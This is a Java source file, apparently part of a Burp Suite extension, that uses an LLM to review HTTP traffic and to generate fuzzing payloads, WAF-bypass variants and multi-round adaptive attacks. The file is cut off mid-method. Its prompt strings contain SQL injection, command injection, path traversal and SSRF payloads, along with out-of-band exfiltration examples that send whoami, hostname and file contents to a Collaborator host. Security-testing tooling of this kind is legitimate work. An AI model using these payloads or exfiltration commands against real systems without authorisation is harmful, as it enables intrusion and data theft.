package com.omnistrike.modules.ai;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.model.*;
import com.omnistrike.modules.ai.llm.*;
import com.omnistrike.framework.ModuleRegistry;

import com.google.gson.*;

import com.omnistrike.framework.SharedDataBus;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * AI-Powered Vulnerability Analyzer with optional active scanning capabilities.
 *
 * Modes (all optional, toggled independently):
 *   - Passive Analysis: LLM reviews HTTP traffic for security issues (default)
 *   - Smart Fuzzing: LLM generates targeted payloads, extension sends them
 *   - WAF Bypass: when payloads are blocked, LLM generates evasion variants
 *   - Adaptive Scanning: multi-round LLM-guided testing
 *
 * Completely optional — disabled by default. Queues all LLM calls to an
 * internal executor so the proxy thread is never blocked.
 */
public class AiVulnAnalyzer implements ScanModule {

    private MontoyaApi api;
    private FindingsStore findingsStore;
    private ModuleRegistry moduleRegistry;
    private CollaboratorManager collaboratorManager;
    private final LlmClient llmClient = new LlmClient();

    // Connection mode — mutually exclusive, volatile for cross-thread visibility
    private volatile AiConnectionMode connectionMode = AiConnectionMode.NONE;

    // Cancellation flag — set to true to abort all running scans immediately
    private volatile boolean cancelled = false;

    // UI logger callback — routes activity messages to the OmniStrike Activity Log panel
    private volatile java.util.function.BiConsumer<String, String> uiLogger;

    // Executors for passive and active scanning
    private ExecutorService llmExecutor;        // passive analysis
    private ExecutorService fuzzExecutor;       // active fuzzing
    private static final int QUEUE_CAPACITY = 50;

    // Dedup: only analyze each METHOD+normalized_path once
    private final ConcurrentHashMap<String, Boolean> analyzed = new ConcurrentHashMap<>();

    // Batch scan queue — users add requests via context menu, then scan all at once
    private static final int MAX_BATCH_QUEUE_SIZE = 100;
    private final CopyOnWriteArrayList<HttpRequestResponse> batchQueue = new CopyOnWriteArrayList<>();
    private volatile boolean batchScanRunning = false;
    private volatile String batchScanStatus = "";

    // Statistics counters (read by UI)
    private final AtomicInteger analyzedCount = new AtomicInteger(0);
    private final AtomicInteger findingsCount = new AtomicInteger(0);
    private final AtomicInteger errorCount = new AtomicInteger(0);
    private final AtomicInteger fuzzRequestsSent = new AtomicInteger(0);
    private final AtomicInteger activeScansRunning = new AtomicInteger(0);
    private final AtomicInteger queuedCount = new AtomicInteger(0);

    // Max body size for LLM prompt (configurable via UI, default 10KB)
    private volatile int maxBodySize = 10000;

    // ==================== Active scanning toggles ====================
    private volatile boolean passiveAnalysisEnabled = true;
    private volatile boolean smartFuzzingEnabled = false;
    private volatile boolean wafBypassEnabled = false;
    private volatile boolean adaptiveScanEnabled = false;

    // Max payloads per LLM request: 0 = unlimited (AI decides), >0 = user-defined cap
    private volatile int maxPayloadsPerRequest = 0;

    // SharedDataBus for tech stack context (Improvement 3)
    private volatile SharedDataBus sharedDataBus;

    // ==================== Improvement 1: WAF Fingerprinting ====================
    // Per-host WAF fingerprint cache — reused across all parameters on the same host
    private final ConcurrentHashMap<String, WafFingerprint> wafFingerprints = new ConcurrentHashMap<>();

    // ==================== Improvement 4: Successful Payload Learning ====================
    // Per-scan session context — accumulates confirmed findings for AI prompt enrichment
    private final CopyOnWriteArrayList<ConfirmedFinding> sessionFindings = new CopyOnWriteArrayList<>();
    private static final int MAX_SESSION_FINDINGS = 10;

    // ==================== Improvement 6: Rate Limit Awareness ====================
    // Per-host rate limit tracking
    private final ConcurrentHashMap<String, RateLimitTracker> rateLimitTrackers = new ConcurrentHashMap<>();

    // ==================== Improvement 7: Prompt Size Management ====================
    // Token budget constants (approximate: 1 token ≈ 4 chars)
    private static final int CONTEXT_TOKEN_BUDGET = 8000;
    private static final int CONTEXT_CHAR_BUDGET = CONTEXT_TOKEN_BUDGET * 4; // ~32K chars
    private static final int RESPONSE_BODY_TRUNCATE = 500; // bytes for adaptive results

    // ==================== Improvement 9: Structured Output Enforcement ====================
    private static final int MAX_JSON_RETRIES = 1;

    // ==================== Improvement 10: Cost Tracking ====================
    private final AtomicLong totalInputTokens = new AtomicLong(0);
    private final AtomicLong totalOutputTokens = new AtomicLong(0);
    private final AtomicInteger totalApiCalls = new AtomicInteger(0);
    private volatile double estimatedCostUsd = 0.0;

    // ==================== Improvement 11: Multi-Step Exploitation ====================
    private static final int MAX_EXPLOIT_ROUNDS = 5;

    // Static file extensions to skip
    private static final Set<String> SKIP_EXTENSIONS = Set.of(
            ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
            ".woff", ".woff2", ".ttf", ".eot", ".otf", ".map", ".webp",
            ".mp3", ".mp4", ".avi", ".mov", ".pdf", ".zip", ".gz", ".tar"
    );

    // Content types to skip
    private static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/", "font/", "audio/", "video/", "application/octet-stream",
            "application/zip", "application/pdf", "application/javascript",
            "text/css", "text/javascript"
    );

    // JWT pattern for evidence extraction
    private static final Pattern JWT_PATTERN = Pattern.compile(
            "eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+");

    // Common WAF signatures in response bodies
    private static final List<String> WAF_SIGNATURES = List.of(
            "access denied", "request blocked", "web application firewall",
            "mod_security", "cloudflare", "akamai", "imperva", "sucuri",
            "forbidden", "not acceptable", "security violation",
            "blocked by", "waf", "attack detected"
    );

    // ==================== LLM Prompts ====================

    private static final String ANALYSIS_PROMPT = """
            You are a senior penetration tester analyzing an HTTP request/response pair for security vulnerabilities.

            Analyze the following HTTP exchange and identify any potential security issues.
            Focus on:
            - Injection vulnerabilities (SQL injection, XSS, command injection, SSTI, LDAP injection)
            - Authentication and session management issues
            - Sensitive data exposure (API keys, tokens, PII in responses)
            - Security misconfigurations (verbose errors, debug modes, default credentials)
            - Broken access control indicators
            - SSRF indicators
            - Insecure deserialization patterns
            - Business logic flaws

            CRITICAL: Only report findings you can PROVE with concrete evidence from the actual traffic data.
            You must cite the exact text, header, parameter value, or response content that proves the vulnerability.
            Do NOT report speculative issues, theoretical risks, or "could be vulnerable" findings.
            For every finding, provide a copy-paste-ready Proof of Concept in the "poc" field (a full URL, curl command, or payload the tester can use immediately).
            POC or nothing — if you cannot prove it, do not report it.
            If there are no provable findings, return {"findings": []}.

            Respond ONLY with valid JSON in this exact format:
            {"findings": [{"title": "Brief title", "severity": "HIGH|MEDIUM|LOW|INFO", "description": "What the issue is", "evidence": "Exact text from the request/response that shows this", "poc": "Copy-paste-ready PoC URL, curl command, or payload", "remediation": "How to fix", "cwe": "CWE-XXX"}]}

            HTTP Exchange:
            """;

    private static final String SMART_FUZZ_PROMPT = """
            You are an expert penetration tester. Analyze this HTTP request and generate targeted security test payloads.

            For each injectable parameter (URL query params, POST body params, headers, cookies), generate the most effective payloads targeting:
            - SQL Injection: error-based FIRST (single/double quote, comment), then UNION, then boolean blind, then time-based (SLEEP(5), WAITFOR DELAY, pg_sleep(5))
            - Cross-Site Scripting: reflected (script tags, event handlers, SVG), DOM-based
            - Server-Side Template Injection: ALWAYS use large unique math like {{133*991}} (=131803), ${7739*397} (=3072383). NEVER use 7*7 — '49' appears on normal pages
            - Command Injection: pipe, semicolon, backtick, $() — include time-based (;sleep 5;, |ping -c 5 127.0.0.1|)
            - Path Traversal / LFI: ../../etc/passwd, ....//....//etc/passwd, ..%252f..%252f variants
            - SSRF: internal IPs, cloud metadata (169.254.169.254), URL scheme abuse

            For time-based blind payloads, use a 5-second delay so it's clearly distinguishable from normal response times.

            Focus on payloads most likely to succeed based on the parameter names, values, content type, and technology stack visible in the traffic.

            Generate as many payloads as you think are necessary to thoroughly test every injectable parameter. Do not limit yourself — be exhaustive. When you have nothing more to try, return an empty list.

            Respond ONLY with valid JSON:
            {"payloads": [{"parameter": "param_name", "injection_point": "query|body|header|cookie", "payload": "the_actual_payload_string", "attack_type": "sqli|xss|ssti|cmdi|path_traversal|ssrf", "description": "brief explanation of why this payload"}]}

            HTTP Request:
            """;

    private static final String WAF_BYPASS_PROMPT = """
            A Web Application Firewall (WAF) blocked the following security test payload.
            Generate as many bypass variants as you can think of using advanced evasion techniques:
            - URL encoding / double URL encoding
            - Case variation and mixed case
            - Comment injection (/**/, --, #, %%2d%%2d)
            - Unicode / hex / octal encoding
            - Alternative SQL/command syntax
            - Whitespace alternatives (tabs, newlines, /**/ as space)
            - Null bytes (%%00)
            - HTTP parameter pollution
            - Chunked transfer encoding tricks
            - Payload fragmentation

            Original blocked payload: %s
            Parameter: %s
            Attack type: %s
            WAF response status: %d
            WAF response snippet: %s

            Respond ONLY with valid JSON:
            {"bypasses": [{"payload": "bypass_payload_string", "technique": "technique_name", "description": "why this might bypass the WAF"}]}
            """;

    private static final String ADAPTIVE_PROMPT = """
            You are an expert penetration tester performing adaptive security testing.
            Based on the results of the previous test round, analyze the responses and generate the next set of targeted payloads.

            Previous test results:
            %s

            Instructions:
            1. If any payload caused a database error, stack trace, or unusual response — generate more targeted variants of that exact payload
            2. If you detected a specific technology (e.g., MySQL, PostgreSQL, Node.js, Jinja2) — generate technology-specific payloads
            3. If WAF patterns were detected — suggest evasion techniques for the SPECIFIC WAF
            4. If a parameter reflected input — try XSS and SSTI variants
            5. If a time-based payload caused a noticeably longer response (>5 seconds) — generate more time-based variants with different delays to confirm (e.g., SLEEP(3) vs SLEEP(7)) and look for proportional delay
            6. Focus on the most promising attack vectors from the previous round

            Generate as many payloads as needed for this round. When you believe all attack vectors have been exhausted, return an empty list to stop.

            Respond ONLY with valid JSON:
            {"payloads": [{"parameter": "param_name", "injection_point": "query|body|header|cookie", "payload": "the_actual_payload_string", "attack_type": "sqli|xss|ssti|cmdi|path_traversal|ssrf", "description": "why this payload based on previous results"}]}
            """;

    private static final String BATCH_ANALYSIS_PROMPT = """
            You are a senior penetration tester performing CROSS-FILE analysis of a web application's client-side code.
            Multiple JavaScript and HTML files from the same application are provided below.
            Your job is to analyze relationships BETWEEN files and find vulnerabilities that span multiple files.

            Focus on:
            1. CROSS-FILE DOM XSS: A source in one file (e.g., location.hash in index.html) flows to a sink in another file (e.g., innerHTML in app.js)
            2. CROSS-FILE PROTOTYPE POLLUTION: A shared library exposes _.merge / $.extend / Object.assign that another script calls with user-controlled input
            3. SHARED SECRETS: API keys, tokens, or credentials defined in one file and used in another
            4. CROSS-FILE DATA FLOWS: User input captured in one file, passed via globals/events/storage to another file where it's used unsafely
            5. INSECURE postMessage: One file sends postMessage, another receives without origin validation
            6. DEPENDENCY CHAINS: HTML loads JS files in a specific order — identify which HTML loads which JS
            7. DOM CLOBBERING: HTML elements with id/name attributes that shadow JS variables in other files
            8. SHARED GLOBAL VARIABLES: Globals set in one file and used dangerously in another
            9. ALL ENDPOINTS: Extract every URL, API path, and endpoint reference across ALL files

            CRITICAL RULES:
            - Map relationships between files (which HTML loads which JS, shared globals, event flows)
            - Trace data flows ACROSS files — sources in one file, sinks in another
            - For EVERY vulnerability you MUST provide a WORKING Proof of Concept in the "poc" field:
              * For XSS: a full URL with the payload that triggers alert()/document.domain (e.g., https://target.com/?search=payload)
              * For prototype pollution: the exact JSON or query string that pollutes Object.prototype
              * For open redirect: the full URL that redirects to an attacker domain
              * For postMessage issues: a minimal HTML page an attacker would host
              * The PoC must be COPY-PASTE READY — the tester should be able to paste it into a browser and see it work
            - For endpoint extraction, create a single INFO finding titled "Discovered Endpoints (Batch)" with ALL URLs/paths from ALL files
            - If no cross-file issues exist, still analyze each file individually for client-side vulns
            - POC or nothing — no speculative findings. If you cannot write a concrete PoC, do not report the finding

            Respond ONLY with valid JSON:
            {"findings": [{"title": "Brief title", "severity": "HIGH|MEDIUM|LOW|INFO", "description": "What the issue is and which files are involved", "evidence": "Exact code from the files that proves this, with file labels", "poc": "Full copy-paste-ready PoC URL or payload", "remediation": "How to fix", "cwe": "CWE-XXX"}]}

            """;

    private static final String BATCH_CONTINUATION_PROMPT = """
            You are continuing a cross-file analysis of a web application's client-side code.
            Previous files have already been analyzed. Here is the summary of what was found so far:

            %s

            Now analyze the following additional files, considering their relationships with the previously analyzed files.
            Look for cross-file vulnerabilities, shared variables, data flows, and endpoint references.

            Same rules apply: POC or nothing, cross-file focus, extract all endpoints.
            Every vulnerability MUST include a copy-paste-ready PoC URL or payload in the "poc" field.

            Respond ONLY with valid JSON:
            {"findings": [{"title": "Brief title", "severity": "HIGH|MEDIUM|LOW|INFO", "description": "What the issue is and which files are involved", "evidence": "Exact code from the files that proves this, with file labels", "poc": "Full copy-paste-ready PoC URL or payload", "remediation": "How to fix", "cwe": "CWE-XXX"}]}

            """;

    // ==================== Module-Specific Focus ====================

    private record ModuleFocus(String displayName, String instructions) {}

    private static final Map<String, ModuleFocus> MODULE_FOCUS = Map.ofEntries(
            Map.entry("sqli-detector", new ModuleFocus("SQL Injection",
                    "SCOPE: SQL Injection ONLY.\n"
                    + "PRIORITY ORDER (test in this order — error-based confirms fastest):\n"
                    + "1. Error-based: single quote ('), double quote (\"), parenthesis closers (), comment sequences (--, #, /**/)\n"
                    + "2. UNION-based: ' UNION SELECT NULL-- with increasing column counts\n"
                    + "3. Boolean blind: ' AND 1=1-- vs ' AND 1=2-- (compare response diff)\n"
                    + "4. Time-based blind: ' AND SLEEP(5)--, '; WAITFOR DELAY '0:0:5'--, ' AND pg_sleep(5)--\n"
                    + "5. Stacked queries: '; SELECT ...--, second-order patterns\n\n"
                    + "Test EVERY injectable parameter. Use BOTH single and double quotes.\n"
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for XSS, SSTI, command injection, SSRF, path traversal, or any other vulnerability type. "
                    + "Every payload MUST have attack_type set to \"sqli\". Any non-SQLi payload will be discarded.")),
            Map.entry("xss-scanner", new ModuleFocus("Cross-Site Scripting (XSS)",
                    "SCOPE: Cross-Site Scripting ONLY (reflected XSS, stored XSS, DOM-based XSS). "
                    + "Generate payloads for: script tags, event handlers, SVG/IMG payloads, template literals, encoding bypasses. "
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for SQLi, SSTI, SSRF, command injection, or any other vulnerability type. "
                    + "Every payload MUST have attack_type set to \"xss\". Any non-XSS payload will be discarded.")),
            Map.entry("ssti-scanner", new ModuleFocus("Server-Side Template Injection (SSTI)",
                    "SCOPE: Server-Side Template Injection ONLY for Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, ERB, Smarty, Thymeleaf.\n"
                    + "PRIORITY ORDER:\n"
                    + "1. Math expression probes (ALWAYS start with these — they confirm SSTI with zero FPs):\n"
                    + "   - {{133*991}} → expect 131803 (Jinja2/Twig)\n"
                    + "   - ${133*991} → expect 131803 (Freemarker/Velocity/Thymeleaf)\n"
                    + "   - #{133*991} → expect 131803 (Thymeleaf/EL)\n"
                    + "   - <%= 133*991 %> → expect 131803 (ERB)\n"
                    + "   - {133*991} → expect 131803 (Smarty)\n"
                    + "   IMPORTANT: Use LARGE UNIQUE products like 133*991=131803, 7739*397=3072383, 9281*473=4389913. "
                    + "NEVER use 7*7=49 — '49' appears on normal pages. The computed result must be a number "
                    + "that would NEVER appear naturally in HTML.\n"
                    + "2. Object traversal / class introspection (Jinja2: ''.__class__.__mro__, Twig: _self.env, etc.)\n"
                    + "3. RCE chains (only after confirming SSTI with math probes)\n\n"
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for XSS, SQLi, SSRF, command injection, or any other type. "
                    + "Every payload MUST have attack_type set to \"ssti\". Any non-SSTI payload will be discarded.")),
            Map.entry("cmdi-scanner", new ModuleFocus("Command Injection",
                    "SCOPE: OS Command Injection ONLY (Linux and Windows). "
                    + "Generate payloads for: pipe, semicolon, backtick, $() substitution, && and || chaining. "
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for SQLi, XSS, SSTI, SSRF, or any other vulnerability type. "
                    + "Every payload MUST have attack_type set to \"cmdi\". Any non-cmdi payload will be discarded.")),
            Map.entry("ssrf-scanner", new ModuleFocus("Server-Side Request Forgery (SSRF)",
                    "SCOPE: SSRF ONLY — internal network access, cloud metadata endpoints (AWS/GCP/Azure), DNS rebinding, protocol smuggling, "
                    + "URL scheme abuse (file://, gopher://, dict://), IP address bypasses (decimal, hex, octal, IPv6). "
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for SQLi, XSS, SSTI, command injection, path traversal, or any other vulnerability type. "
                    + "No <script> tags, no SQL quotes, no template expressions. ONLY URLs and SSRF vectors. "
                    + "Every payload MUST have attack_type set to \"ssrf\". Any non-SSRF payload will be discarded.")),
            Map.entry("xxe-scanner", new ModuleFocus("XML External Entity (XXE) Injection",
                    "SCOPE: XXE Injection ONLY — external entities, parameter entities, blind XXE with OOB, XInclude. "
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for SQLi, XSS, SSRF, or any other vulnerability type. "
                    + "Every payload MUST have attack_type set to \"xxe\". Any non-XXE payload will be discarded.")),
            Map.entry("deser-scanner", new ModuleFocus("Insecure Deserialization",
                    "SCOPE: Insecure Deserialization ONLY for Java, .NET, PHP, Python. "
                    + "STRICTLY FORBIDDEN: Do NOT generate ANY payloads for SQLi, XSS, SSRF, or any other vulnerability type. "
                    + "Every payload MUST have attack_type set to \"deserialization\". Any non-deserialization payload will be discarded.")),
            Map.entry("header-analyzer", new ModuleFocus("Security Header Misconfiguration",
                    "Security header issues: missing HSTS, CSP, X-Frame-Options, CORS misconfig, cookie flags, server disclosure. "
                    + "Do NOT report injection vulnerabilities.")),
            Map.entry("endpoint-finder", new ModuleFocus("Hidden API Endpoint Discovery",
                    "Look for hidden/undocumented API endpoints, paths, and routes in the response. "
                    + "Do NOT report injection vulnerabilities.")),
            Map.entry("subdomain-collector", new ModuleFocus("Subdomain Discovery",
                    "Look for subdomains and related hosts in CSP, CORS, redirects, response bodies. "
                    + "Do NOT report injection vulnerabilities.")),
            Map.entry("client-side-analyzer", new ModuleFocus("Client-Side Vulnerability Analysis",
                    "Client-side security issues in JavaScript and HTML responses. "
                    + "Analyze the RESPONSE body for:\n"
                    + "1. DOM XSS source-to-sink flows (location.hash/search → innerHTML/eval/document.write)\n"
                    + "2. Prototype pollution (__proto__, constructor.prototype, $.extend, _.merge, _.defaultsDeep) "
                    + "— trace if user input (URL params, JSON body, postMessage data) can reach these sinks\n"
                    + "3. Hardcoded secrets/API keys (AWS, Google, Stripe, GitHub tokens, private keys, passwords)\n"
                    + "4. Insecure postMessage handlers without origin validation\n"
                    + "5. Open redirect patterns (location = location.hash, window.open(user_input))\n"
                    + "6. Sensitive data in localStorage/sessionStorage\n"
                    + "7. Dangerous eval/Function usage with non-literal arguments\n"
                    + "8. Information disclosure (internal IPs, debug endpoints, source maps)\n"
                    + "9. Path traversal — JS code that builds file paths from user input (fetch('/api/files/' + param), "
                    + "file/path/dir/download URL parameters)\n"
                    + "10. ALL URLs and API endpoints found in the response — extract every URL, API path, "
                    + "and endpoint reference. List them ALL in a table in the evidence field.\n\n"
                    + "Focus on the response body content, not on injecting payloads. "
                    + "Do NOT report server-side injection vulnerabilities (SQLi, SSTI, command injection).\n\n"
                    + "CRITICAL: For every vulnerability finding, you MUST provide a working Proof of Concept (POC):\n"
                    + "- DOM XSS: exact URL with payload (e.g., https://target.com/page#<img src=x onerror=alert(1)>)\n"
                    + "- Prototype pollution: exact URL or JS snippet to trigger it "
                    + "(e.g., https://target.com/page?__proto__[polluted]=true or "
                    + "constructor.prototype.polluted = true via JSON merge)\n"
                    + "- Open redirects: crafted URL that redirects to attacker.com\n"
                    + "- Insecure postMessage: full attacker HTML page code that exploits it\n"
                    + "- Hardcoded secrets: exact secret value and a curl/API call showing how to use it\n"
                    + "- Path traversal: exact URL with traversal payload (e.g., ?file=../../../../etc/passwd)\n"
                    + "Include the POC in the 'evidence' field.\n\n"
                    + "For endpoint extraction, create a single INFO finding titled 'Discovered Endpoints' with "
                    + "ALL URLs/paths listed as a numbered table in the evidence field."))
    );

    private String buildAnalysisPrompt(String targetModuleId) {
        if (targetModuleId != null && MODULE_FOCUS.containsKey(targetModuleId)) {
            ModuleFocus focus = MODULE_FOCUS.get(targetModuleId);
            return "You are a senior penetration tester. Analyze this HTTP exchange EXCLUSIVELY for "
                    + focus.displayName() + ".\n\n"
                    + focus.instructions() + "\n\n"
                    + "CRITICAL RULES:\n"
                    + "- ONLY report " + focus.displayName() + " findings. NOTHING ELSE.\n"
                    + "- Do NOT report XSS, SQLi, SSRF, or any other vulnerability type unless it is " + focus.displayName() + ".\n"
                    + "- Only report findings you can PROVE with concrete evidence from the request/response.\n"
                    + "- If no provable " + focus.displayName() + " issues found, return {\"findings\": []}.\n\n"
                    + "- For every finding, include a copy-paste-ready PoC in the \"poc\" field.\n\n"
                    + "Respond ONLY with valid JSON:\n"
                    + "{\"findings\": [{\"title\": \"Brief title\", \"severity\": \"HIGH|MEDIUM|LOW|INFO\", "
                    + "\"description\": \"What the issue is\", \"evidence\": \"Exact text from the request/response\", "
                    + "\"poc\": \"Copy-paste-ready PoC\", "
                    + "\"remediation\": \"How to fix\", \"cwe\": \"CWE-XXX\"}]}\n\n"
                    + "HTTP Exchange:\n";
        }
        return ANALYSIS_PROMPT;
    }

    private String buildFuzzPrompt(String targetModuleId) {
        int limit = maxPayloadsPerRequest;
        String limitLine = (limit > 0)
                ? "Generate at most " + limit + " total payloads.\n\n"
                : "Generate as many payloads as necessary. Be exhaustive. When you have nothing more to try, return an empty list.\n\n";

        // Collaborator info for OOB payloads
        String collabLine = buildCollaboratorPromptSection();

        if (targetModuleId != null && MODULE_FOCUS.containsKey(targetModuleId)) {
            ModuleFocus focus = MODULE_FOCUS.get(targetModuleId);
            String attackType = getAttackType(targetModuleId);
            return "You are an expert penetration tester. Generate ONLY " + focus.displayName() + " payloads.\n\n"
                    + focus.instructions() + "\n\n"
                    + collabLine
                    + limitLine
                    + "CRITICAL RULES:\n"
                    + "- EVERY payload MUST be a " + focus.displayName() + " payload. Nothing else.\n"
                    + "- EVERY payload MUST have attack_type set to exactly \"" + attackType + "\".\n"
                    + "- Payloads with any other attack_type will be AUTOMATICALLY DISCARDED.\n"
                    + "- Do NOT include XSS, SQLi, or other unrelated payloads even if you see potential for them.\n\n"
                    + "Respond ONLY with valid JSON:\n"
                    + "{\"payloads\": [{\"parameter\": \"param_name\", \"injection_point\": \"query|body|header|cookie|xml\", "
                    + "\"payload\": \"the_actual_payload_string\", \"attack_type\": \"" + attackType + "\", "
                    + "\"description\": \"brief explanation\"}]}\n\n"
                    + "HTTP Request:\n";
        }

        // Generic prompt — inject the limit and collaborator info dynamically
        String base = SMART_FUZZ_PROMPT;
        if (limit > 0) {
            base = base.replace(
                    "Generate as many payloads as you think are necessary to thoroughly test every injectable parameter. Do not limit yourself — be exhaustive. When you have nothing more to try, return an empty list.",
                    "Generate at most " + limit + " total payloads across all parameters.");
        }
        if (!collabLine.isEmpty()) {
            base = base.replace("HTTP Request:\n", collabLine + "HTTP Request:\n");
        }
        return base;
    }

    /**
     * Builds the Collaborator section for AI prompts.
     * Tells the AI to use {COLLAB} placeholder for OOB payloads.
     */
    private String buildCollaboratorPromptSection() {
        if (collaboratorManager == null || !collaboratorManager.isAvailable()) {
            return "";
        }
        String serverAddr = collaboratorManager.getServerAddress();
        if (serverAddr == null || serverAddr.isEmpty()) {
            return "";
        }
        // Improvement 5: Collaborator-aware payload chaining with data exfiltration
        return "OUT-OF-BAND (OOB) TESTING: You have access to a Burp Collaborator server at: " + serverAddr + "\n"
                + "For any blind/OOB payloads (blind SQLi, blind XXE, blind SSRF, blind command injection, etc.), "
                + "use the literal placeholder {COLLAB} wherever you need a unique Collaborator subdomain.\n"
                + "Example: For blind XXE, use <!ENTITY xxe SYSTEM \"http://{COLLAB}\">\n"
                + "Example: For blind SSRF, use http://{COLLAB}/test\n"
                + "Example: For blind SQLi DNS exfil, use LOAD_FILE('\\\\\\\\{COLLAB}\\\\a')\n"
                + "The {COLLAB} placeholder will be automatically replaced with a real tracked Collaborator URL.\n\n"
                + "DATA EXFILTRATION via Collaborator:\n"
                + "When generating OOB/blind payloads, embed data exfiltration in the Collaborator subdomain:\n"
                + "- Command Injection: nslookup $(whoami).{COLLAB} or nslookup $(cat /etc/hostname | base32 | tr -d =).{COLLAB}\n"
                + "- SQL OOB (MySQL): SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{COLLAB}\\\\\\\\a'))\n"
                + "- SQL OOB (MSSQL): exec master..xp_dirtree '\\\\\\\\' + db_name() + '.{COLLAB}\\\\a'\n"
                + "- SQL OOB (Oracle): SELECT UTL_HTTP.REQUEST('http://'||user||'.{COLLAB}') FROM DUAL\n"
                + "- XXE OOB: <!ENTITY % exfil SYSTEM 'http://{COLLAB}/?data=file:///etc/passwd'>\n"
                + "This turns binary OOB confirmation into data extraction. The exfiltrated data appears as a subdomain in the Collaborator interaction.\n\n";
    }

    private static String getAttackType(String moduleId) {
        return switch (moduleId) {
            case "sqli-detector" -> "sqli";
            case "xss-scanner" -> "xss";
            case "ssti-scanner" -> "ssti";
            case "cmdi-scanner" -> "cmdi";
            case "ssrf-scanner" -> "ssrf";
            case "xxe-scanner" -> "xxe";
            case "deser-scanner" -> "deserialization";
            case "client-side-analyzer" -> "client-side";
            default -> "unknown";
        };
    }

    /**
     * Checks if a payload's attack_type matches the expected type for the target module.
     * Handles AI returning variations like "SSRF", "ssrf", "server-side request forgery", etc.
     */
    private static boolean isMatchingAttackType(String payloadType, String expectedType) {
        if (payloadType == null || payloadType.isBlank()) return false;
        if (expectedType == null || "unknown".equals(expectedType)) return true; // no filter
        String p = payloadType.toLowerCase().trim();
        String e = expectedType.toLowerCase().trim();
        // Exact match
        if (p.equals(e)) return true;
        // Contains match (e.g., "sql_injection" contains "sqli" — nope, be stricter)
        // Use a mapping of known aliases
        return switch (e) {
            case "sqli" -> p.contains("sqli") || p.contains("sql") && !p.contains("nosql");
            case "xss" -> p.contains("xss") || p.contains("cross-site scripting");
            case "ssti" -> p.contains("ssti") || p.contains("template");
            case "cmdi" -> p.contains("cmdi") || p.contains("command") || p.contains("rce") || p.contains("os_command");
            case "ssrf" -> p.contains("ssrf") || p.contains("server-side request");
            case "xxe" -> p.contains("xxe") || p.contains("xml external");
            case "deserialization" -> p.contains("deser");
            case "client-side" -> p.contains("client") || p.contains("dom") || p.contains("prototype");
            default -> p.contains(e);
        };
    }

    // ==================== ScanModule interface ====================

    @Override
    public String getId() { return "ai-vuln-analyzer"; }

    @Override
    public String getName() { return "AI Vulnerability Analyzer"; }

    @Override
    public String getDescription() {
        return "AI-powered security analysis with optional smart fuzzing, WAF bypass, and adaptive scanning.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.RECON; }

    @Override
    public boolean isPassive() { return true; }

    public void setDependencies(FindingsStore findingsStore) {
        this.findingsStore = findingsStore;
    }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;

        // Bounded queue with single thread for passive analysis — natural rate limiting
        BlockingQueue<Runnable> passiveQueue = new LinkedBlockingQueue<>(QUEUE_CAPACITY);
        llmExecutor = new ThreadPoolExecutor(1, 1,
                0L, TimeUnit.MILLISECONDS, passiveQueue,
                r -> {
                    Thread t = new Thread(r, "OmniStrike-AI-Passive");
                    t.setDaemon(true);
                    return t;
                },
                new ThreadPoolExecutor.DiscardPolicy());

        // Separate single-threaded executor for active fuzzing
        BlockingQueue<Runnable> fuzzQueue = new LinkedBlockingQueue<>(QUEUE_CAPACITY);
        fuzzExecutor = new ThreadPoolExecutor(1, 1,
                0L, TimeUnit.MILLISECONDS, fuzzQueue,
                r -> {
                    Thread t = new Thread(r, "OmniStrike-AI-Fuzzer");
                    t.setDaemon(true);
                    return t;
                },
                new ThreadPoolExecutor.DiscardPolicy());
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        // Quick filtering on the proxy thread — never block
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String method = requestResponse.request().method();

        // Skip static resources
        if (isStaticResource(url)) return Collections.emptyList();

        // Skip uninteresting content types
        String contentType = getContentType(requestResponse);
        if (shouldSkipContentType(contentType)) return Collections.emptyList();

        // Skip tiny or huge responses
        String responseBody = requestResponse.response().bodyToString();
        if (responseBody == null || responseBody.length() < 50 || responseBody.length() > 100000) {
            return Collections.emptyList();
        }

        // Dedup by METHOD + normalized path
        String dedupKey = method + "+" + normalizePath(url);
        if (analyzed.putIfAbsent(dedupKey, Boolean.TRUE) != null) {
            return Collections.emptyList();
        }

        // Capture data as an immutable snapshot (safe for background thread)
        CapturedHttpExchange exchange;
        try {
            exchange = CapturedHttpExchange.from(requestResponse, maxBodySize);
        } catch (Exception e) {
            return Collections.emptyList();
        }

        // Queue passive analysis
        if (passiveAnalysisEnabled) {
            try {
                llmExecutor.submit(() -> {
                    activeScansRunning.incrementAndGet();
                    try {
                        analyzeWithLlm(exchange, requestResponse);
                    } finally {
                        activeScansRunning.decrementAndGet();
                    }
                });
                queuedCount.set(getQueueSize());
            } catch (RejectedExecutionException ignored) {
                // Queue full
            }
        }

        // Queue smart fuzzing (active) — capture flags at queue time
        if (smartFuzzingEnabled) {
            final boolean waf = wafBypassEnabled;
            final boolean adaptive = adaptiveScanEnabled;
            try {
                fuzzExecutor.submit(() -> {
                    activeScansRunning.incrementAndGet();
                    try {
